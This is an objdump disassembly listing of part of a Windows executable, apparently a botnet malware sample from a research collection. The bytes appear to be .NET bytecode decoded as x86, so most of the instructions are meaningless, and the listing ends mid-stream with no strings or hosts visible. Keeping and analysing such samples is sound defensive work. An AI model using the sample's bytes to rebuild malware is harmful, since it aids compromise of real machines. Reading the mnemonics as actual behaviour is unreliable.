
malware_samples/botnet/264f2f1e6c9d09a332df26de494c112f24d020ce495324e4b5251b61cf722329.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	90                   	nop
  402001:	c3                   	ret
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 20 57 00    	add    %al,0x572000
  402013:	00 38                	add    %bh,(%eax)
  402015:	6c                   	insb   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1a 00                	sbb    (%eax),%al
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 12                	jle    0x402095
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 13                	jle    0x4020a5
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 14                	jle    0x4020b5
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 15                	jle    0x4020c5
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 16                	jle    0x4020d5
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 17                	jle    0x4020e5
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 18                	jle    0x4020f5
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 19                	jle    0x402105
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1b                	jle    0x40211d
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  40210d:	2a 2a                	sub    (%edx),%ch
  40210f:	02 28                	add    (%eax),%ch
  402111:	3e 00 00             	add    %al,%ds:(%eax)
  402114:	0a 16                	or     (%esi),%dl
  402116:	fe 03                	incb   (%ebx)
  402118:	2a 32                	sub    (%edx),%dh
  40211a:	7e 0b                	jle    0x402127
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 03                	add    $0x3,%al
  402120:	6f                   	outsl  %ds:(%esi),(%dx)
  402121:	3f                   	aas
  402122:	00 00                	add    %al,(%eax)
  402124:	0a 2a                	or     (%edx),%ch
  402126:	36 28 17             	sub    %dl,%ss:(%edi)
  402129:	00 00                	add    %al,(%eax)
  40212b:	06                   	push   %es
  40212c:	17                   	pop    %ss
  40212d:	58                   	pop    %eax
  40212e:	28 18                	sub    %bl,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	2a 2e                	sub    (%esi),%ch
  402135:	73 1a                	jae    0x402151
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40213f:	2a 32                	sub    (%edx),%dh
  402141:	7e 1c                	jle    0x40215f
  402143:	00 00                	add    %al,(%eax)
  402145:	04 02                	add    $0x2,%al
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	21 00                	and    %eax,(%eax)
  40214a:	00 0a                	add    %cl,(%edx)
  40214c:	2a 32                	sub    (%edx),%dh
  40214e:	7e 1c                	jle    0x40216c
  402150:	00 00                	add    %al,(%eax)
  402152:	04 02                	add    $0x2,%al
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40215a:	32 02                	xor    (%edx),%al
  40215c:	28 56 00             	sub    %dl,0x0(%esi)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	28 26                	sub    %ah,(%esi)
  402163:	00 00                	add    %al,(%eax)
  402165:	06                   	push   %es
  402166:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  40216c:	00 01                	add    %al,(%ecx)
  40216e:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402173:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402178:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  40217f:	63 d2                	arpl   %edx,%edx
  402181:	9c                   	pushf
  402182:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402187:	63 d2                	arpl   %edx,%edx
  402189:	9c                   	pushf
  40218a:	2a 4e 18             	sub    0x18(%esi),%cl
  40218d:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402191:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  402197:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40219c:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 28                	or     (%eax),%ch
  4021a7:	26 00 00             	add    %al,%es:(%eax)
  4021aa:	06                   	push   %es
  4021ab:	2a 2e                	sub    (%esi),%ch
  4021ad:	73 58                	jae    0x402207
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4021b7:	2a 56 02             	sub    0x2(%esi),%dl
  4021ba:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  4021bf:	04 02                	add    $0x2,%al
  4021c1:	28 1a                	sub    %bl,(%edx)
  4021c3:	00 00                	add    %al,(%eax)
  4021c5:	0a 02                	or     (%edx),%al
  4021c7:	03 7d 1d             	add    0x1d(%ebp),%edi
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	04 2a                	add    $0x2a,%al
  4021ce:	4a                   	dec    %edx
  4021cf:	02 7b 1d             	add    0x1d(%ebx),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 02                	add    $0x2,%al
  4021d6:	7b 1e                	jnp    0x4021f6
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	04 6f                	add    $0x6f,%al
  4021dc:	59                   	pop    %ecx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 2a                	or     (%edx),%ch
  4021e1:	8a 02                	mov    (%edx),%al
  4021e3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	04 17                	add    $0x17,%al
  4021ea:	58                   	pop    %eax
  4021eb:	7d 1e                	jge    0x40220b
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	04 02                	add    $0x2,%al
  4021f1:	7b 1e                	jnp    0x402211
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	04 02                	add    $0x2,%al
  4021f7:	7b 1d                	jnp    0x402216
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 6f                	add    $0x6f,%al
  4021fd:	5a                   	pop    %edx
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a fe                	or     %dh,%bh
  402202:	04 2a                	add    $0x2a,%al
  402204:	22 02                	and    (%edx),%al
  402206:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  40220b:	04 2a                	add    $0x2a,%al
  40220d:	56                   	push   %esi
  40220e:	02 28                	add    (%eax),%ch
  402210:	1a 00                	sbb    (%eax),%al
  402212:	00 0a                	add    %cl,(%edx)
  402214:	02 03                	add    (%ebx),%al
  402216:	7d 20                	jge    0x402238
  402218:	00 00                	add    %al,(%eax)
  40221a:	04 02                	add    $0x2,%al
  40221c:	04 7d                	add    $0x7d,%al
  40221e:	1f                   	pop    %ds
  40221f:	00 00                	add    %al,(%eax)
  402221:	04 2a                	add    $0x2a,%al
  402223:	32 02                	xor    (%edx),%al
  402225:	7b 20                	jnp    0x402247
  402227:	00 00                	add    %al,(%eax)
  402229:	04 6f                	add    $0x6f,%al
  40222b:	3f                   	aas
  40222c:	00 00                	add    %al,(%eax)
  40222e:	06                   	push   %es
  40222f:	2a 4e 02             	sub    0x2(%esi),%cl
  402232:	7b 20                	jnp    0x402254
  402234:	00 00                	add    %al,(%eax)
  402236:	04 6f                	add    $0x6f,%al
  402238:	3f                   	aas
  402239:	00 00                	add    %al,(%eax)
  40223b:	06                   	push   %es
  40223c:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402241:	00 06                	add    %al,(%esi)
  402243:	2a 4e 02             	sub    0x2(%esi),%cl
  402246:	7b 20                	jnp    0x402268
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 6f                	add    $0x6f,%al
  40224c:	3f                   	aas
  40224d:	00 00                	add    %al,(%eax)
  40224f:	06                   	push   %es
  402250:	25 03 6f 42 00       	and    $0x426f03,%eax
  402255:	00 06                	add    %al,(%esi)
  402257:	2a 4e 02             	sub    0x2(%esi),%cl
  40225a:	7b 20                	jnp    0x40227c
  40225c:	00 00                	add    %al,(%eax)
  40225e:	04 6f                	add    $0x6f,%al
  402260:	3f                   	aas
  402261:	00 00                	add    %al,(%eax)
  402263:	06                   	push   %es
  402264:	25 03 6f 53 00       	and    $0x536f03,%eax
  402269:	00 06                	add    %al,(%esi)
  40226b:	2a 36                	sub    (%esi),%dh
  40226d:	02 7b 1f             	add    0x1f(%ebx),%bh
  402270:	00 00                	add    %al,(%eax)
  402272:	04 03                	add    $0x3,%al
  402274:	6f                   	outsl  %ds:(%esi),(%dx)
  402275:	59                   	pop    %ecx
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 2a                	or     (%edx),%ch
  40227a:	32 02                	xor    (%edx),%al
  40227c:	7b 1f                	jnp    0x40229d
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 6f                	add    $0x6f,%al
  402282:	5a                   	pop    %edx
  402283:	00 00                	add    %al,(%eax)
  402285:	0a 2a                	or     (%edx),%ch
  402287:	66 02 03             	data16 add (%ebx),%al
  40228a:	7d 21                	jge    0x4022ad
  40228c:	00 00                	add    %al,(%eax)
  40228e:	04 02                	add    $0x2,%al
  402290:	02 7b 21             	add    0x21(%ebx),%bh
  402293:	00 00                	add    %al,(%eax)
  402295:	04 6f                	add    $0x6f,%al
  402297:	5b                   	pop    %ebx
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 7d 22             	or     0x22(%ebp),%bh
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 2a                	add    $0x2a,%al
  4022a1:	76 02                	jbe    0x4022a5
  4022a3:	7b 24                	jnp    0x4022c9
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 18                	add    $0x18,%al
  4022a9:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	02 18                	add    (%eax),%bl
  4022b3:	7d 24                	jge    0x4022d9
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	04 02                	add    $0x2,%al
  4022b9:	28 3a                	sub    %bh,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	2a 76 02             	sub    0x2(%esi),%dh
  4022c1:	7b 24                	jnp    0x4022e7
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	04 19                	add    $0x19,%al
  4022c7:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022cd:	00 06                	add    %al,(%esi)
  4022cf:	02 19                	add    (%ecx),%bl
  4022d1:	7d 24                	jge    0x4022f7
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 02                	add    $0x2,%al
  4022d7:	28 3a                	sub    %bh,(%edx)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	06                   	push   %es
  4022dc:	2a 1e                	sub    (%esi),%bl
  4022de:	02 28                	add    (%eax),%ch
  4022e0:	3e 00 00             	add    %al,%ds:(%eax)
  4022e3:	06                   	push   %es
  4022e4:	2a 52 02             	sub    0x2(%edx),%dl
  4022e7:	03 8c 51 00 00 01 7d 	add    0x7d010000(%ecx,%edx,2),%ecx
  4022ee:	23 00                	and    (%eax),%eax
  4022f0:	00 04 02             	add    %al,(%edx,%eax,1)
  4022f3:	1b 7d 24             	sbb    0x24(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	52                   	push   %edx
  4022fb:	02 03                	add    (%ebx),%al
  4022fd:	8c 52 00             	mov    %ss,0x0(%edx)
  402300:	00 01                	add    %al,(%ecx)
  402302:	7d 23                	jge    0x402327
  402304:	00 00                	add    %al,(%eax)
  402306:	04 02                	add    $0x2,%al
  402308:	1c 7d                	sbb    $0x7d,%al
  40230a:	24 00                	and    $0x0,%al
  40230c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40230f:	42                   	inc    %edx
  402310:	02 03                	add    (%ebx),%al
  402312:	7d 23                	jge    0x402337
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	1f                   	pop    %ds
  402319:	0b 7d 24             	or     0x24(%ebp),%edi
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 2a                	add    $0x2a,%al
  402320:	52                   	push   %edx
  402321:	02 28                	add    (%eax),%ch
  402323:	3e 00 00             	add    %al,%ds:(%eax)
  402326:	06                   	push   %es
  402327:	25 03 7d 21 00       	and    $0x217d03,%eax
  40232c:	00 04 04             	add    %al,(%esp,%eax,1)
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	4f                   	dec    %edi
  402331:	00 00                	add    %al,(%eax)
  402333:	06                   	push   %es
  402334:	2a 56 02             	sub    0x2(%esi),%dl
  402337:	28 3e                	sub    %bh,(%esi)
  402339:	00 00                	add    %al,(%eax)
  40233b:	06                   	push   %es
  40233c:	25 03 7d 21 00       	and    $0x217d03,%eax
  402341:	00 04 04             	add    %al,(%esp,%eax,1)
  402344:	6a 6f                	push   $0x6f
  402346:	42                   	inc    %edx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a f6                	sub    %dh,%dh
  40234c:	02 7b 23             	add    0x23(%ebx),%bh
  40234f:	00 00                	add    %al,(%eax)
  402351:	04 2c                	add    $0x2c,%al
  402353:	33 03                	xor    (%ebx),%eax
  402355:	1c 73                	sbb    $0x73,%al
  402357:	77 00                	ja     0x402359
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	25 02 7b 23 00       	and    $0x237b02,%eax
  402360:	00 04 74             	add    %al,(%esp,%esi,2)
  402363:	03 00                	add    (%eax),%eax
  402365:	00 1b                	add    %bl,(%ebx)
  402367:	16                   	push   %ss
  402368:	02 7b 23             	add    0x23(%ebx),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 74                	add    $0x74,%al
  40236f:	03 00                	add    (%eax),%eax
  402371:	00 1b                	add    %bl,(%ebx)
  402373:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402376:	4c                   	dec    %esp
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 25 6f 76 00 00    	or     0x766f,%ah
  40237f:	0a 6f 41             	or     0x41(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 17                	or     (%edi),%dl
  402386:	2a 16                	sub    (%esi),%dl
  402388:	2a 56 02             	sub    0x2(%esi),%dl
  40238b:	28 39                	sub    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  402397:	02 17                	add    (%edi),%dl
  402399:	7d 24                	jge    0x4023bf
  40239b:	00 00                	add    %al,(%eax)
  40239d:	04 2a                	add    $0x2a,%al
  40239f:	3e 02 03             	add    %ds:(%ebx),%al
  4023a2:	7d 23                	jge    0x4023c7
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	04 02                	add    $0x2,%al
  4023a8:	1a 7d 24             	sbb    0x24(%ebp),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 2a                	add    $0x2a,%al
  4023af:	6a 02                	push   $0x2
  4023b1:	7b 23                	jnp    0x4023d6
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	04 2d                	add    $0x2d,%al
  4023b7:	06                   	push   %es
  4023b8:	72 61                	jb     0x40241b
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	70 2a                	jo     0x4023e8
  4023be:	02 7b 23             	add    0x23(%ebx),%bh
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 6f                	add    $0x6f,%al
  4023c5:	38 00                	cmp    %al,(%eax)
  4023c7:	00 0a                	add    %cl,(%edx)
  4023c9:	2a 52 02             	sub    0x2(%edx),%dl
  4023cc:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  4023d1:	04 02                	add    $0x2,%al
  4023d3:	03 8c 5e 00 00 01 7d 	add    0x7d010000(%esi,%ebx,2),%ecx
  4023da:	23 00                	and    (%eax),%eax
  4023dc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023df:	56                   	push   %esi
  4023e0:	02 1f                	add    (%edi),%bl
  4023e2:	09 7d 24             	or     %edi,0x24(%ebp)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 02                	add    $0x2,%al
  4023e9:	03 8c 54 00 00 01 7d 	add    0x7d010000(%esp,%edx,2),%ecx
  4023f0:	23 00                	and    (%eax),%eax
  4023f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023f5:	52                   	push   %edx
  4023f6:	02 1e                	add    (%esi),%bl
  4023f8:	7d 24                	jge    0x40241e
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	03 8c 53 00 00 01 7d 	add    0x7d010000(%ebx,%edx,2),%ecx
  402405:	23 00                	and    (%eax),%eax
  402407:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40240a:	1e                   	push   %ds
  40240b:	02 28                	add    (%eax),%ch
  40240d:	50                   	push   %eax
  40240e:	00 00                	add    %al,(%eax)
  402410:	06                   	push   %es
  402411:	2a 22                	sub    (%edx),%ah
  402413:	02 03                	add    (%ebx),%al
  402415:	28 4f 00             	sub    %cl,0x0(%edi)
  402418:	00 06                	add    %al,(%esi)
  40241a:	2a 1e                	sub    (%esi),%bl
  40241c:	02 28                	add    (%eax),%ch
  40241e:	45                   	inc    %ebp
  40241f:	00 00                	add    %al,(%eax)
  402421:	06                   	push   %es
  402422:	2a 22                	sub    (%edx),%ah
  402424:	02 03                	add    (%ebx),%al
  402426:	28 42 00             	sub    %al,0x0(%edx)
  402429:	00 06                	add    %al,(%esi)
  40242b:	2a 1e                	sub    (%esi),%bl
  40242d:	02 28                	add    (%eax),%ch
  40242f:	46                   	inc    %esi
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	2a 22                	sub    (%edx),%ah
  402435:	02 03                	add    (%ebx),%al
  402437:	28 53 00             	sub    %dl,0x0(%ebx)
  40243a:	00 06                	add    %al,(%esi)
  40243c:	2a 1e                	sub    (%esi),%bl
  40243e:	02 7b 24             	add    0x24(%ebx),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 2a                	add    $0x2a,%al
  402445:	32 02                	xor    (%edx),%al
  402447:	7b 26                	jnp    0x40246f
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 73                	add    $0x73,%al
  40244d:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  402452:	4a                   	dec    %edx
  402453:	02 73 83             	add    -0x7d(%ebx),%dh
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 7d 26             	or     0x26(%ebp),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 02                	add    $0x2,%al
  40245f:	28 1a                	sub    %bl,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 2a                	or     (%edx),%ch
  402465:	3a 02                	cmp    (%edx),%al
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	7a 00                	jp     0x40246a
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	d2 02                	rolb   %cl,(%edx)
  40246e:	28 65 00             	sub    %ah,0x0(%ebp)
  402471:	00 06                	add    %al,(%esi)
  402473:	2a 32                	sub    (%edx),%dh
  402475:	02 20                	add    (%eax),%ah
  402477:	c0 00 00             	rolb   $0x0,(%eax)
  40247a:	00 6f 62             	add    %ch,0x62(%edi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	0a 2a                	or     (%edx),%ch
  402481:	6a 02                	push   $0x2
  402483:	20 cb                	and    %cl,%bl
  402485:	00 00                	add    %al,(%eax)
  402487:	00 6f 62             	add    %ch,0x62(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	0a 02                	or     (%edx),%al
  40248e:	03 28                	add    (%eax),%ebp
  402490:	2a 00                	sub    (%eax),%al
  402492:	00 06                	add    %al,(%esi)
  402494:	16                   	push   %ss
  402495:	1e                   	push   %ds
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	4c                   	dec    %esp
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 2a                	or     (%edx),%ch
  40249c:	7e 02                	jle    0x4024a0
  40249e:	20 ca                	and    %cl,%dl
  4024a0:	00 00                	add    %al,(%eax)
  4024a2:	00 6f 62             	add    %ch,0x62(%edi)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	0a 02                	or     (%edx),%al
  4024a9:	03 28                	add    (%eax),%ebp
  4024ab:	71 00                	jno    0x4024ad
  4024ad:	00 0a                	add    %cl,(%edx)
  4024af:	28 26                	sub    %ah,(%esi)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	06                   	push   %es
  4024b4:	16                   	push   %ss
  4024b5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 2a                	or     (%edx),%ch
  4024bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bd:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  4024c0:	02 20                	add    (%eax),%ah
  4024c2:	c3                   	ret
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 6f 62             	add    %ch,0x62(%edi)
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 2a                	or     (%edx),%ch
  4024cc:	02 20                	add    (%eax),%ah
  4024ce:	c2 00 00             	ret    $0x0
  4024d1:	00 6f 62             	add    %ch,0x62(%edi)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	aa                   	stos   %al,%es:(%edi)
  4024d9:	28 75 00             	sub    %dh,0x0(%ebp)
  4024dc:	00 06                	add    %al,(%esi)
  4024de:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4024e3:	00 06                	add    %al,(%esi)
  4024e5:	2d 15 28 77 00       	sub    $0x772815,%eax
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4024f1:	00 06                	add    %al,(%esi)
  4024f3:	2d 07 28 74 00       	sub    $0x742807,%eax
  4024f8:	00 06                	add    %al,(%esi)
  4024fa:	2c 06                	sub    $0x6,%al
  4024fc:	14 28                	adc    $0x28,%al
  4024fe:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402503:	56                   	push   %esi
  402504:	28 d0                	sub    %dl,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40250b:	00 00                	add    %al,(%eax)
  40250d:	0a 20                	or     (%eax),%ah
  40250f:	20 02                	and    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	d2 00                	rolb   %cl,(%eax)
  402516:	00 0a                	add    %cl,(%edx)
  402518:	2a 62 7e             	sub    0x7e(%edx),%ah
  40251b:	39 00                	cmp    %eax,(%eax)
  40251d:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402520:	10 7e 39             	adc    %bh,0x39(%esi)
  402523:	00 00                	add    %al,(%eax)
  402525:	04 6f                	add    $0x6f,%al
  402527:	df 00                	filds  (%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	14 80                	adc    $0x80,%al
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402532:	66 7e 0f             	data16 jle 0x402544
  402535:	00 00                	add    %al,(%eax)
  402537:	04 28                	add    $0x28,%al
  402539:	17                   	pop    %ss
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40253f:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  402545:	05 28 8b 00 00       	add    $0x8b28,%eax
  40254a:	06                   	push   %es
  40254b:	2a 56 72             	sub    0x72(%esi),%dl
  40254e:	f7 25 00 70 7e 10    	mull   0x107e7000
  402554:	00 00                	add    %al,(%eax)
  402556:	04 28                	add    $0x28,%al
  402558:	51                   	push   %ecx
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 80 3a 00 00 04    	or     0x400003a(%eax),%al
  402561:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  402567:	06                   	push   %es
  402568:	25 72 75 20 00       	and    $0x207572,%eax
  40256d:	70 6f                	jo     0x4025de
  40256f:	4d                   	dec    %ebp
  402570:	00 00                	add    %al,(%eax)
  402572:	06                   	push   %es
  402573:	72 a3                	jb     0x402518
  402575:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  402579:	5a                   	pop    %edx
  40257a:	00 00                	add    %al,(%eax)
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	57                   	push   %edi
  40257f:	00 00                	add    %al,(%eax)
  402581:	06                   	push   %es
  402582:	28 1e                	sub    %bl,(%esi)
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	20 e8                	and    %ch,%al
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 28                	add    %ch,(%eax)
  40258d:	14 00                	adc    $0x0,%al
  40258f:	00 0a                	add    %cl,(%edx)
  402591:	2a da                	sub    %dl,%bl
  402593:	73 62                	jae    0x4025f7
  402595:	00 00                	add    %al,(%eax)
  402597:	06                   	push   %es
  402598:	25 72 75 20 00       	and    $0x207572,%eax
  40259d:	70 6f                	jo     0x40260e
  40259f:	4d                   	dec    %ebp
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	06                   	push   %es
  4025a3:	72 b5                	jb     0x40255a
  4025a5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4025a9:	5a                   	pop    %edx
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	06                   	push   %es
  4025ad:	25 72 b5 26 00       	and    $0x26b572,%eax
  4025b2:	70 6f                	jo     0x402623
  4025b4:	4d                   	dec    %ebp
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 6f 5a             	add    0x5a(%edi),%ch
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bf:	57                   	push   %edi
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	28 1e                	sub    %bl,(%esi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	2a 2e                	sub    (%esi),%ch
  4025ca:	73 83                	jae    0x40254f
